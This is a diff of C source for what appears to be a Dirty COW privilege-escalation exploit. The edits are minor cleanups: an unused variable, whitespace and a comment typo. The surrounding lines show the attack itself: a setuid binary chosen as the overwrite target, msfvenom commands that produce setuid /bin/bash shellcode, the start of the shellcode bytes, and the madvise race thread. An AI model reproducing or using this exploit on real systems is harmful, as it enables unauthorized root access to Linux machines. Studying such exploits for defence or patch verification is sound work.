@@ -30,12 +30,11 @@ void *map;
 int f;
 int stop = 0;
 struct stat st;
-char *name;
 pthread_t pth1,pth2,pth3;
 
 // change if no permissions to read
 char suid_binary[] = "/usr/bin/passwd";
-
+    
 /*
 * $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
 */ 
@@ -59,7 +58,7 @@ char suid_binary[] = "/usr/bin/passwd";
 // unsigned int sc_len = 177;
 
 
-// $ msfvenom -p linux/x64/exec CMD="echo 0 > /proc/sys/vm/dirty_writeback_centisecs && /bin/bash" PrependSetuid=True -f elf | xxd -i4
+// $ msfvenom -p linux/x64/exec CMD="echo 0 > /proc/sys/vm/dirty_writeback_centisecs && /bin/bash" PrependSetuid=True -f elf | xxd -i
 // the echo 0 > /proc/sys/vm/dirty_writeback_centisecs is to prevent freeze on ubuntu machines
 unsigned char sc[] = {
   0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -113,7 +112,6 @@ void *madviseThread(void *arg)
         c+=madvise(map,100,MADV_DONTNEED);
     }
     printf("thread madvise stopped after %d iterations\n", i);
-
 }
 
 void *procselfmemThread(void *arg)
